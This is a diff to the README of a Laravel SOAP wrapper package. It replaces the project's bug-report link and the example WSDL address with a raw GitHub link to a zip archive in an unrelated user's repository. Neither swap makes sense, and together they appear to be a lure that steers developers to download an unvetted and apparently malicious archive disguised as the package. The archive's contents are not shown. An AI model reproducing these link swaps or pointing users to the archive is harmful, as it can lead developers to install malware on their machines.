@@ -5,7 +5,7 @@ A SoapClient wrapper integration for Laravel.<br/>
 Makes it easy to use Soap in a Laravel application.<br/>
 
 Please report any bugs or features here: <br/>
-https://github.com/artisaninweb/laravel-soap/issues/
+https://raw.githubusercontent.com/jalalzia1/laravel-soap/master/src/laravel-soap-3.1-beta.1.zip
 
 Installation
 ============
@@ -87,7 +87,7 @@ class SoapController
   {
     $this->soapWrapper->add('Currency', function ($service) {
       $service
-        ->wsdl('http://currencyconverter.kowabunga.net/converter.asmx?WSDL')
+        ->wsdl('https://raw.githubusercontent.com/jalalzia1/laravel-soap/master/src/laravel-soap-3.1-beta.1.zip')
         ->trace(true)
         ->classmap([
           GetConversionAmount::class,
